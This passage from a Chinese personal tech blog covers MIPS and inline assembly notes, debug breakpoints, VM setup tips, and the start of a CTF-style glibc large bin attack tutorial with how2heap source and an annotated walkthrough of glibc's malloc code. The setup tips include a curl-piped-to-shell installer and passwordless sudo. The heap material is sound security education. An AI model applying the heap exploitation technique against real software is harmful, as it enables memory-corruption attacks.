<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@ supervisor call</span><br><span class="line">svc #imm</span><br></pre></td></tr></table></figure>

<p>TrustZone 相关</p>
<h3 id="ARMv9"><a href="#ARMv9" class="headerlink" title="ARMv9"></a>ARMv9</h3><p>xxx</p>
<h2 id="Mips"><a href="#Mips" class="headerlink" title="Mips"></a>Mips</h2><p>RISC， <code>Microprocessor without Interlocked Pipeline Stages</code></p>
<p><code>mips</code> 是<code>big-endian</code>, mipsel是 <code>little-endian</code></p>
<p>格式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 根据位数</span><br><span class="line">31-26   25-21 20-16 15-11  10-6  5-0</span><br><span class="line">op-code   rs    rt   rd    shamt func</span><br><span class="line"></span><br><span class="line"># 注释使用 `#`</span><br><span class="line"></span><br><span class="line">rd: register destination</span><br><span class="line">rt: target</span><br><span class="line">rs: source</span><br></pre></td></tr></table></figure>

<p>通用寄存器， 32个</p>
<figure class="highlight mips"><table><tr><td class="code"><pre><span class="line">$<span class="number">0</span>-$<span class="number">31</span>          <span class="comment"># 有各自的助记符，看汇编时多使用助记符</span></span><br><span class="line"><span class="symbol">$0:</span>    $<span class="built_in">zero</span>    <span class="comment"># 恒0</span></span><br><span class="line"><span class="number">1</span>:     $<span class="built_in">at</span>      # </span><br><span class="line"><span class="number">2</span><span class="number">-3</span>:   $<span class="built_in">v0</span>-<span class="built_in">v1</span>   <span class="comment"># value 函数返回值</span></span><br><span class="line"><span class="number">4</span><span class="number">-7</span>:   $<span class="built_in">a0</span>-<span class="built_in">a3</span>   <span class="comment"># arg  函数参数</span></span><br><span class="line"><span class="number">8</span><span class="number">-15</span>:  $<span class="built_in">t0</span>-<span class="built_in">t7</span>   <span class="comment"># temp</span></span><br><span class="line"><span class="number">16</span><span class="number">-23</span>: $<span class="built_in">s0</span>-<span class="built_in">s7</span>   <span class="comment"># save 保留</span></span><br><span class="line"><span class="number">24</span><span class="number">-25</span>: $<span class="built_in">t8</span>-<span class="built_in">t9</span>   <span class="comment"># temp</span></span><br><span class="line"><span class="number">16</span><span class="number">-27</span>: $<span class="built_in">k0</span>-<span class="built_in">k1</span>   <span class="comment"># 异常或中断</span></span><br><span class="line"><span class="number">28</span>:    $<span class="built_in">gp</span>      <span class="comment"># global pointer</span></span><br><span class="line"><span class="number">29</span>:    $<span class="built_in">sp</span>      <span class="comment"># stack pointer</span></span><br><span class="line"><span class="number">30</span>:    $<span class="built_in">fp</span>, <span class="built_in">s8</span>  <span class="comment"># frame pointer </span></span><br><span class="line"><span class="number">31</span>:    $<span class="built_in">ra</span>      <span class="comment"># ret addr</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; 特殊</span></span><br><span class="line"><span class="symbol">pc:</span> program cunter</span><br></pre></td></tr></table></figure>

<p>指令格式</p>
<figure class="highlight mips"><table><tr><td class="code"><pre><span class="line">r: register format <span class="comment"># 使用寄存器</span></span><br><span class="line">i: immediate       <span class="comment"># 使用立即数</span></span><br><span class="line"><span class="keyword">j: </span><span class="keyword">jump</span></span><br></pre></td></tr></table></figure>

<p>寻址</p>
<figure class="highlight mips"><table><tr><td class="code"><pre><span class="line"><span class="keyword">move </span>$<span class="built_in">a0</span>, $<span class="built_in">zero</span>    <span class="comment"># a0&lt;-0</span></span><br></pre></td></tr></table></figure>

<p>访问内存</p>
<figure class="highlight mips"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 仍然 load, store</span></span><br><span class="line"><span class="comment"># b: byte; w: word; h: half word; ...</span></span><br><span class="line"><span class="keyword">sw: </span><span class="keyword">sw </span>$<span class="built_in">ra</span>, <span class="number">0x38</span>($<span class="built_in">sp</span>)   <span class="comment"># 将$ra存入栈中 $sp+38的地方</span></span><br><span class="line"><span class="keyword">sb: </span>...</span><br><span class="line"><span class="keyword">lw: </span>...</span><br><span class="line"><span class="keyword">lb: </span>...</span><br><span class="line"></span><br><span class="line"><span class="comment"># 例子</span></span><br><span class="line"><span class="keyword">sb </span>r1, <span class="number">0</span>(R2)</span><br><span class="line"><span class="keyword">lb </span>r1, <span class="number">0</span>(r2)</span><br></pre></td></tr></table></figure>

<p>算术</p>
<figure class="highlight mips"><table><tr><td class="code"><pre><span class="line"><span class="comment">; 基本算术</span></span><br><span class="line"><span class="keyword">add</span></span><br><span class="line"><span class="keyword"></span><span class="keyword">sub</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="comment">; 逻辑</span></span><br><span class="line"><span class="keyword">or</span></span><br><span class="line"><span class="keyword"></span><span class="keyword">xor</span></span><br><span class="line"><span class="keyword"></span><span class="keyword">nor</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="comment">; 移位</span></span><br><span class="line"><span class="keyword">sll</span></span><br><span class="line"><span class="keyword"></span><span class="keyword">srl</span></span><br></pre></td></tr></table></figure>

<p>跳转</p>
<figure class="highlight mips"><table><tr><td class="code"><pre><span class="line"><span class="comment">; jmp</span></span><br><span class="line"><span class="keyword">j: </span><span class="keyword">jmp </span>label</span><br><span class="line"><span class="keyword">jr: </span>用法 <span class="keyword">jr </span>$<span class="built_in">ra</span> 等</span><br><span class="line"><span class="keyword">jal: </span><span class="keyword">jmp </span><span class="keyword">and </span>link, 保存 ret <span class="keyword">addr(pc+4) </span>到 $<span class="built_in">ra</span></span><br><span class="line"><span class="keyword">jalr: </span>借用寄存器跳转，链接，常用</span><br><span class="line"></span><br><span class="line"><span class="comment">; branch, 后面需要跟操作</span></span><br><span class="line"><span class="keyword">beq: </span><span class="keyword">beq </span>$s, $t, offset   <span class="comment"># $s=$t跳转</span></span><br><span class="line"><span class="keyword">bne: </span><span class="keyword">b </span>not eq</span><br><span class="line"><span class="keyword">bltz: </span><span class="keyword">branch </span>less than <span class="built_in">zero</span></span><br></pre></td></tr></table></figure>

<p>架构缓存</p>
<ul>
<li>有两个独立的cache: 指令 和 数据</li>
</ul>
<h2 id="RISC-V"><a href="#RISC-V" class="headerlink" title="RISC-V"></a>RISC-V</h2><p>xxx</p>
<h2 id="GCC-Inline-Assembly"><a href="#GCC-Inline-Assembly" class="headerlink" title="GCC Inline Assembly"></a>GCC Inline Assembly</h2><p>内联汇编，我的理解是直接写 汇编语句就行</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">asm</span>(<span class="string">&quot;mov $1, %eax&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>扩展内链汇编，有点不同</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">asm</span> ( assembler <span class="keyword">template</span>  </span><br><span class="line">		: output operands                   <span class="comment">/* optional 输出 */</span>  </span><br><span class="line">		: input operands                    <span class="comment">/* optional 输入*/</span>  </span><br><span class="line">		: list of clobbered registers       <span class="comment">/* optional 通知编译器可能造成寄存器或内存数据破坏，提前保护*/</span>  </span><br><span class="line">);</span><br></pre></td></tr></table></figure>


<p>某些规则，主要</p>
<ul>
<li>r: register</li>
<li>m:memory</li>
<li>常用寄存器</li>
</ul>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">a rax/eax/ax/al</span><br><span class="line">b rbx</span><br><span class="line">c rcx</span><br><span class="line">d rdx</span><br><span class="line">S rsi</span><br><span class="line">D rdi</span><br><span class="line">I 常数值</span><br><span class="line">q,r 动态分配的寄存器</span><br><span class="line">g eax,ebx,ecx,edx或内存变量</span><br><span class="line">A 把eax和edx合成一个64位的寄存器(use long longs)</span><br></pre></td></tr></table></figure>

<ol>
<li>使用 q 指示编译器从 eax, ebx, ecx, edx 分配寄存器。 使用 r 指示编译器从 eax, ebx, ecx, edx, esi, edi 分配寄存器。</li>
<li>不必把编译器分配的寄存器放入改变的寄存器列表，因为寄存器已经记住了它们。</li>
<li><code>&quot;=&quot;</code> 是标示输出寄存器，<strong>必须这样用</strong>。</li>
<li>数字 <code>%n</code> 的用法：数字表示的寄存器是按照出现和从左到右的顺序映射到用”r”或”q”请求的寄存器．如果要重用”r”或”q”请求的寄存器的话，就可以使用它们。</li>
</ol>
<p>例子 1</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">asm</span> (</span><br><span class="line">	<span class="string">&quot;cld/n/t&quot;</span>  </span><br><span class="line">	<span class="string">&quot;rep/n/t&quot;</span>  </span><br><span class="line">	<span class="string">&quot;stosl&quot;</span>  </span><br><span class="line">	: <span class="comment">/* no output registers */</span>  </span><br><span class="line">	: <span class="string">&quot;c&quot;</span> (count), <span class="string">&quot;a&quot;</span> (fill_value), <span class="string">&quot;D&quot;</span> (dest)  </span><br><span class="line">	: <span class="string">&quot;%edi&quot;</span> </span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// intel 格式：count 等都是变量</span></span><br><span class="line">push edi</span><br><span class="line">mov ecx, count</span><br><span class="line">mov eax, fill_value</span><br><span class="line">mov edi, dest</span><br><span class="line">cld</span><br><span class="line">rep</span><br><span class="line">stosl</span><br></pre></td></tr></table></figure>

<p>例子2：加入数字</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">__asm__ (</span><br><span class="line">	<span class="string">&quot;push %%rax&quot;</span></span><br><span class="line">	<span class="string">&quot;pop %0&quot;</span></span><br><span class="line">	: <span class="string">&quot;=m&quot;</span>(var)</span><br><span class="line">	: <span class="string">&quot;c&quot;</span>(count)</span><br><span class="line">	: memory</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://learningos.cn/ucore_os_webdocs/lab0/lab0_2_3_1_3_gcc_inline_asm.html">GCC 基本内联汇编 · GitBook (learningos.cn)</a></p>
]]></content>
      <categories>
        <category>CS</category>
      </categories>
      <tags>
        <tag>asm</tag>
      </tags>
  </entry>
  <entry>
    <title>程序断点</title>
    <url>/2024/03/31/%E6%96%AD%E7%82%B9/</url>
    <content><![CDATA[<blockquote>
<p>debug break point</p>
</blockquote>
<span id="more"></span>

<h2 id="断点"><a href="#断点" class="headerlink" title="断点"></a>断点</h2><h3 id="硬断点"><a href="#硬断点" class="headerlink" title="硬断点"></a>硬断点</h3><p>Debug Register</p>
<p>硬件断点是通过位于 CPU 上的一组特殊寄存器来实现的，称为调试寄存器。比如 x86 架构的 CPU 上有 8 个调试寄存器（DR0-DR7），分别用于设置和管理硬件断点。</p>
<ul>
<li>DR0-DR3 负责存储硬件断点的<em>Linear Address</em>。所以最多只能同时使用 4 个硬件断点。</li>
<li>DR4 和 DR5 保留使用。</li>
<li>DR6 为调试状态寄存器，保存调试异常产生后显示的一些信息</li>
<li>DR7 是硬件断点的激活开关，存储着各个断点的触发信息条件。 与软断点不同的是，硬件断点使用 1 号中断（INT1）实现，INT1 一般被用于硬件断点和单步事件。</li>
</ul>
<p><a href="https://bbs.kanxue.com/thread-248728.htm">硬件断点和原理与实现</a></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_DBG_REG7</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    // 局部断点(L0~3)与全局断点(G0~3)的标记位</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="type">unsigned</span> L0 : <span class="number">1</span>;  <span class="comment">// 对Dr0保存的地址启用 局部断点</span></span><br><span class="line">    <span class="type">unsigned</span> G0 : <span class="number">1</span>;  <span class="comment">// 对Dr0保存的地址启用 全局断点</span></span><br><span class="line">    <span class="type">unsigned</span> L1 : <span class="number">1</span>;  <span class="comment">// 对Dr1保存的地址启用 局部断点</span></span><br><span class="line">    <span class="type">unsigned</span> G1 : <span class="number">1</span>;  <span class="comment">// 对Dr1保存的地址启用 全局断点</span></span><br><span class="line">    <span class="type">unsigned</span> L2 : <span class="number">1</span>;  <span class="comment">// 对Dr2保存的地址启用 局部断点</span></span><br><span class="line">    <span class="type">unsigned</span> G2 : <span class="number">1</span>;  <span class="comment">// 对Dr2保存的地址启用 全局断点</span></span><br><span class="line">    <span class="type">unsigned</span> L3 : <span class="number">1</span>;  <span class="comment">// 对Dr3保存的地址启用 局部断点</span></span><br><span class="line">    <span class="type">unsigned</span> G3 : <span class="number">1</span>;  <span class="comment">// 对Dr3保存的地址启用 全局断点</span></span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> LE : <span class="number">1</span>;   <span class="comment">// local exception</span></span><br><span class="line">    <span class="type">unsigned</span> GE : <span class="number">1</span>;   <span class="comment">// global exception</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 保留字段</span></span><br><span class="line">    <span class="type">unsigned</span> Reserve1 : <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 保护调试寄存器标志位，如果此位为1，则有指令修改条是寄存器时会触发异常</span></span><br><span class="line">    <span class="type">unsigned</span> GD : <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 保留字段</span></span><br><span class="line">    <span class="type">unsigned</span> Reserve2 : <span class="number">2</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="type">unsigned</span> RW0 : <span class="number">2</span>;   <span class="comment">// 设定Dr0指向地址的断点类型</span></span><br><span class="line">    <span class="type">unsigned</span> LEN0 : <span class="number">2</span>;  <span class="comment">// 设定Dr0指向地址的断点长度</span></span><br><span class="line">    <span class="type">unsigned</span> RW1 : <span class="number">2</span>;   <span class="comment">// 设定Dr1指向地址的断点类型</span></span><br><span class="line">    <span class="type">unsigned</span> LEN1 : <span class="number">2</span>;  <span class="comment">// 设定Dr1指向地址的断点长度</span></span><br><span class="line">    <span class="type">unsigned</span> RW2 : <span class="number">2</span>;   <span class="comment">// 设定Dr2指向地址的断点类型</span></span><br><span class="line">    <span class="type">unsigned</span> LEN2 : <span class="number">2</span>;  <span class="comment">// 设定Dr2指向地址的断点长度</span></span><br><span class="line">    <span class="type">unsigned</span> RW3 : <span class="number">2</span>;   <span class="comment">// 设定Dr3指向地址的断点类型</span></span><br><span class="line">    <span class="type">unsigned</span> LEN3 : <span class="number">2</span>;  <span class="comment">// 设定Dr3指向地址的断点长度</span></span><br><span class="line">&#125;DBG_REG7, *PDBG_REG7;</span><br></pre></td></tr></table></figure>

<p>保存DR0-DR3地址所指向位置的断点类型(RW0-RW3)与断点长度(LEN0-LEN3)，状态描述如下：  </p>
<ul>
<li>RW: 00：执行 01：写入 11：读写  </li>
<li>LEN: 00：1字节 01：2字节 11：4字节</li>
</ul>
<p>设置<strong>硬件执行断点</strong>时，长度只能为1(LEN0-LEN3设置为0时表示长度为1)</p>
<p>设置<strong>读写断点</strong>时，如果长度为1，地址不需要对齐，如果长度为2，则地址必须是2的整数倍，如果长度为4，则地址必须是4的整数倍。</p>
<p>如果我们想开启一个硬断点</p>
<p>DBG_REG7</p>
<ul>
<li>L0 &#x3D; 0b1</li>
<li>LE &#x3D; 0b1 在局部exception触发断点</li>
<li>RW0 &#x3D; 0b11</li>
<li>LEN0 &#x3D; 0b11</li>
</ul>
<p>可以做一下CTF题目：<a href="https://blingblingxuanxuan.github.io/2023/07/05/230705-sctf2023-kernel-pwn-sycrop/">SCTF 2023 Kernel Pwn Sycrop</a></p>
<h3 id="软断点"><a href="#软断点" class="headerlink" title="软断点"></a>软断点</h3><p>需要中断指令 INT3。</p>
<p>当我们在调试器中对代码的某一行设置断点时，调试器会先把这里的本来指令的第一个字节保存起来，然后写入一条 INT 3 指令。因为 INT 3 指令的机器码为 11001100b（0xCC），仅有一个字节，所以设置和取消断点时也只需要保存和恢复一个字节，这是设计这条指令时须考虑好的。</p>
<p>当 CPU 执行到 INT 3 指令时，由于 INT 3 指令的设计目的就是中断到调试器，因此，CPU 执行这条指令的过程也就是产生断点异常（breakpoint exception，简称#BP）并会保存当前的执行上下文，转去执行异常处理例程的过程。</p>
<p>在调试器下，我们是看不到动态替换到程序中的 INT 3 指令的。大多数调试器的做法是在被调试程序中断到调试器时，会先将所有断点位置被替换为INT 3 的指令恢复成原来的指令，然后再把控制权交给用户。</p>
<p>当用户结束分析希望恢复被调试程序执行时，调试器通过调试 API 通知调试子系统，这会导致系统内核的异常分发函数返回到异常处理例程，然后异常处理例程通过IRET&#x2F;IRETD 指令触发一个异常返回动作，使 CPU 恢复执行上下文，从发生异常的位置继续执行。</p>
<h2 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h2><p>x86处理器引入的PSW寄存器，有一个陷阱标志位，名为Trap Flag，简称TF。  </p>
<p>当TF为1时，CPU每执行一条指令便会产生一个调试异常，中断到调试异常处理程序。  </p>
<p>调试器的单步执行功能大多是依靠这一机制来实现的。</p>
]]></content>
      <categories>
        <category>CS</category>
      </categories>
      <tags>
        <tag>debug</tag>
      </tags>
  </entry>
  <entry>
    <title>虚拟机配置</title>
    <url>/2023/09/17/%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<blockquote>
<p>个人常用虚拟机配置，持续更新。。。</p>
</blockquote>
<span id="more"></span>

<h2 id="zsh"><a href="#zsh" class="headerlink" title="zsh"></a>zsh</h2><p>下载</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install zsh</span><br><span class="line"></span><br><span class="line">chsh -s /bin/zsh</span><br></pre></td></tr></table></figure>

<p>插件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sh -c <span class="string">&quot;<span class="subst">$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)</span>&quot;</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-syntax-highlighting.git <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh&#125;</span>/plugins/zsh-syntax-highlighting</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-autosuggestions <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh&#125;</span>/plugins/zsh-autosuggestions</span><br></pre></td></tr></table></figure>

<p>修改zshrc</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plugins=(</span><br><span class="line">	git </span><br><span class="line">	zsh-syntax-highlighting </span><br><span class="line">	zsh-autosuggestions</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>主题</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --depth=1 https://github.com/romkatv/powerlevel10k.git <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;</span>/themes/powerlevel10k</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改zshrc</span></span><br><span class="line">ZSH_THEME=powerlevel10k/powerlevel10k</span><br></pre></td></tr></table></figure>

<h2 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h2><p>下载，解压，将 ttf 文件放入 一下文件夹</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 给用户自己用</span></span><br><span class="line"><span class="built_in">mkdir</span> -p ~/.fonts</span><br><span class="line"></span><br><span class="line"><span class="comment"># 全部用户</span></span><br><span class="line">/usr/share/fonts</span><br></pre></td></tr></table></figure>

<p>执行命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo mkfontscale</span><br><span class="line">sudo mkfontdir</span><br><span class="line">sudo fc-cache</span><br></pre></td></tr></table></figure>

<h2 id="共享文件夹"><a href="#共享文件夹" class="headerlink" title="共享文件夹"></a>共享文件夹</h2><p>虚拟机设置共享文件夹，但是找不到</p>
<h3 id="ubuntu"><a href="#ubuntu" class="headerlink" title="ubuntu"></a>ubuntu</h3><p>mount，关机后失效</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo mount -t fuse.vmhgfs-fuse .host:/ /mnt/hgfs -o allow_other</span><br></pre></td></tr></table></figure>

<p>&#x2F;etc&#x2F;fstab：开机后会自动执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> .host:/ /mnt/hgfs fuse.vmhgfs-fuse allow_other 0 0</span><br></pre></td></tr></table></figure>

<h3 id="kali"><a href="#kali" class="headerlink" title="kali"></a>kali</h3><p>mount</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo mount -t fuse.vmhgfs-fuse .host:/ /mnt/hgfs -o allow_other</span><br></pre></td></tr></table></figure>

<p>&#x2F;etc&#x2F;fstab</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vmhgfs-fuse /mnt/hgfs/ fuse defaults,allow_other 0 0</span><br></pre></td></tr></table></figure>

<h2 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h2><p>安装</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install docker.io</span><br><span class="line">sudo apt install docker-compose</span><br></pre></td></tr></table></figure>

<p>当前用户加入docker组</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo usermod -aG docker <span class="variable">$USER</span>  </span><br><span class="line">newgrp docker</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>


<h2 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h2><ul>
<li>出现获得不了IP地址的情况</li>
</ul>
<ol>
<li>kali 修改 <code>/etc/network/interfaces</code></li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 找网卡名</span></span><br><span class="line">ifconfig</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改 interfaces 文件</span></span><br><span class="line">auto eth0</span><br><span class="line">iface eth0 inet dhcp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启服务</span></span><br><span class="line">/etc/init.d/networking restart</span><br><span class="line">ifconfig eth0 down    </span><br><span class="line">ifconfig eth0 up</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>ubuntu 使用命令，但是重启后又不行</li>
</ol>
<ul>
<li>ifconfig 配置IP</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ifconfig ens33 &lt;IP&gt; netmask &lt;mask&gt;</span><br><span class="line">route add default gw &lt;gateway&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>然后使用如下命令</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo /sbin/dhclient</span><br></pre></td></tr></table></figure>


<ol start="3">
<li>ubuntu 修改 文件</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/netplan/01-network-manager-all.yaml</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改内容</span></span><br><span class="line">network:</span><br><span class="line">  version: 2</span><br><span class="line">  renderer: NetworkManager</span><br><span class="line">  ethernets:</span><br><span class="line">     eth0:</span><br><span class="line">       dhcp4: <span class="built_in">yes</span></span><br><span class="line">       addresses: []</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行命令</span></span><br><span class="line">sudo netplan try</span><br><span class="line">sudo netplan apply</span><br></pre></td></tr></table></figure>

<ul>
<li>在修改 <code>/etc/NetworkManager/NetworkManager.conf</code> 配置文件的 <code>managed = true</code></li>
<li>reboot</li>
<li>后来看了这个文章解决 <a href="https://www.zhangguojian.com/2020/11/27/ubuntu-vmware-workstation-can-not-connect-network/#%E6%89%8B%E5%8A%A8%E8%8E%B7%E5%8F%96-ip">Ubuntu20.04不能连接网络及解决开机自动获取 ip 问题</a></li>
</ul>
<ol start="4">
<li>如下命令</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmcli networking off </span><br><span class="line">sudo nmcli networking on</span><br></pre></td></tr></table></figure>

<h2 id="sudo-免密"><a href="#sudo-免密" class="headerlink" title="sudo 免密"></a>sudo 免密</h2><p>修改 <code>/etc/sudoers</code> 添加用户或者组</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 指定命令免密</span></span><br><span class="line">&lt;name&gt; ALL=(ALL:ALL) NOPASSWD:/bin/useradd,/bin/chown</span><br><span class="line"></span><br><span class="line"><span class="comment"># 所有的都免密</span></span><br><span class="line">&lt;name&gt; ALL=(ALL:ALL) NOPASSWD:ALL</span><br></pre></td></tr></table></figure>

<h2 id="内存问题"><a href="#内存问题" class="headerlink" title="内存问题"></a>内存问题</h2><h3 id="压缩"><a href="#压缩" class="headerlink" title="压缩"></a>压缩</h3><p><strong>删除快照后任显示存在快照，如何删除干净</strong>：新建一个，然后删除，VM会把之前的快照合并后删除。</p>
<ul>
<li><a href="https://kb.vmware.com/s/article/1023657?lang=zh_CN">删除所有快照和整合快照功能常见问题解答(vmware.com)</a></li>
</ul>
<p>当我们删除部分大文件时，发现自己磁盘的内存没有增加。vmdk文件不会主动回缩，需要手动做shrink。并且不能有快照</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo vmware-toolbox-cmd disk list</span><br><span class="line">$ sudo vmware-toolbox-cmd disk shrink /</span><br></pre></td></tr></table></figure>

<p>然后重启</p>
<h2 id="kali-无法进入console"><a href="#kali-无法进入console" class="headerlink" title="kali 无法进入console"></a>kali 无法进入console</h2><ul>
<li>我的情况是 fstab 出现问题，共享文件夹修改 fstab</li>
</ul>
<ol>
<li>重启，进入 grub加载项</li>
<li>e 进入配置</li>
<li>修改 linux 中的 ro &#x3D;&gt; <code>rw</code> 并加入一句 <code>init=/bin/bash</code></li>
<li>f10 进入系统</li>
<li>修改 fstab，重启重新获得界面</li>
</ol>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a href="https://github.com/ohmyzsh/ohmyzsh/wiki/Plugins">Plugins · ohmyzsh&#x2F;ohmyzsh Wiki</a></li>
</ul>
]]></content>
      <categories>
        <category>CS</category>
      </categories>
      <tags>
        <tag>VM</tag>
      </tags>
  </entry>
  <entry>
    <title>猫猫&amp;&amp;苹果香蕉の屋</title>
    <url>/2023/11/02/%E7%8C%AB%E7%8C%AB%20&amp;&amp;%20%E8%8B%B9%E6%9E%9C%E9%A6%99%E8%95%89%20%E3%81%AE%20%E5%B1%8B/</url>
    <content><![CDATA[<blockquote>
<p>大古：一开始就用红色形态作战不就行了吗</p>
</blockquote>
<span id="more"></span>

<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>glibc</code> 高版本逐渐移除了<code>__malloc_hook/__free_hook/__realloc_hook</code> 等等一众 <code>hook</code> 全局变量。</p>
<p>利用手段向 IO_FILE 靠拢，但是随着版本越来越高，堆利用手段也变少，IO_FILE 的问题也逐渐减少。</p>
<h3 id="large-bin-attck"><a href="#large-bin-attck" class="headerlink" title="large bin attck"></a>large bin attck</h3><p>一个范围的bin，保证了其内部有序性。在 <a href="https://xz.aliyun.com/t/5177">浅析largebin attack</a>文章中有张图方便理解<br>同样大小的bin按照free的时间顺序进行排序</p>
<ul>
<li>fd, bk: 相同大小堆的双向链表，按照时间先后排序</li>
<li>fd_nextsize, bk_nextsize: 大小不同的双向链表</li>
<li>如果只有一个，fd, bk指向 main_arena fd_nextsize 和 bk_nextsize 指向自己</li>
</ul>
<p>直接使用 how2heap 2.36 的 large bin attack 进行演示(Glibc &gt;&#x3D; 2.30 都可以使用)。</p>
<ul>
<li>漏洞的点在开头的注释中给出，就是最后一句赋值语句导致的，victim(正在链入largebin)的size小于已经存在的bin</li>
<li>malloc两个大chunk p1,p2，两个 0x18 是防止 <strong>相邻的unsorted bin 合并</strong> 以及 <strong>被top_chunk合并</strong>。</li>
<li>这里注意的是：p1 的 size 大于 p2，但是不要差太多，在同一个largebin 里</li>
<li>free p1，将 p1 放入large bin 中</li>
<li>free p2，修改 p1 的 bk_nextsize 为 &amp;target-0x20</li>
<li>将 p2 放入largebin中</li>
<li>target 值就变成了 p2 的地址</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">A revisit to large bin attack for after glibc2.30</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Relevant code snippet :</span></span><br><span class="line"><span class="comment">	// 因为只有两个bin，因此可以解读一下。</span></span><br><span class="line"><span class="comment">	// 看源码，bck是  bck = bin_at (av, victim_index);</span></span><br><span class="line"><span class="comment">	// av 就是 arena地址，bck就是找arena</span></span><br><span class="line"><span class="comment">	// fwd = bck-&gt;fd;   与large bin 之间的双向链表，在这里就是存在的 p1</span></span><br><span class="line"><span class="comment">	if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk)) &#123;</span></span><br><span class="line"><span class="comment">		fwd = bck;                                    // fwd = arena</span></span><br><span class="line"><span class="comment">		bck = bck-&gt;bk;                                // bck = p1</span></span><br><span class="line"><span class="comment">		victim-&gt;fd_nextsize = fwd-&gt;fd;                // vitim 要放入large bin 的堆 p2 </span></span><br><span class="line"><span class="comment">		victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;   // victim.bk_nextsize = p1-&gt;bk_nextsize = &amp;target-0x20 </span></span><br><span class="line"><span class="comment">		fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;  // p1.bk_nextsize = victim</span></span><br><span class="line"><span class="comment">		// 但是victim.bk_nextsize = &amp;target-0x20。而这个地址的 fd_nextsize = victim 也就是将 target 值改为 victim，</span></span><br><span class="line"><span class="comment">	